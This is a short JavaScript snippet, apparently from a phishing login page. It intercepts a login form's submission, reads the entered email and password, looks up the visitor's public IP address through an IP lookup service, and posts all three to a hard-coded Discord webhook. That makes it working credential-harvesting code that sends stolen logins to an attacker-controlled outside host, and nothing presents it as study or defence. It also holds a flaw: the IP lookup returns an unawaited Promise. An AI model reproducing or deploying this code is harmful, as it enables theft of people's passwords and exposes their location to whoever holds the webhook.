document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const ip = getIPAddress(); // Function to get the user's IP address

    const data = {
        content: 'User Login Information',
        embeds: [
            {
                title: 'Login Details',
                fields: [
                    { name: 'Email', value: email, inline: true },
                    { name: 'Password', value: password, inline: true },
                    { name: 'IP Address', value: ip, inline: true }
                ],
                color: 0x4caf50
            }
        ]
    };

    console.log('Sending data to Discord:', data);

    fetch('https://discord.com/api/webhooks/1558973991887052890/iLid20j3V67XsHgKYwLNXnMX2828XXpoJHJcAdV5wlLcESDO7ylGr4qab8QOHRUnGHNq', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': JSON.stringify(data).length
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        console.log('Response status:', response.status);
        return response.json();
    })
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});

// Function to get the user's IP address
function getIPAddress() {
    return new Promise(resolve => {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => resolve(data.ip));
    });
}
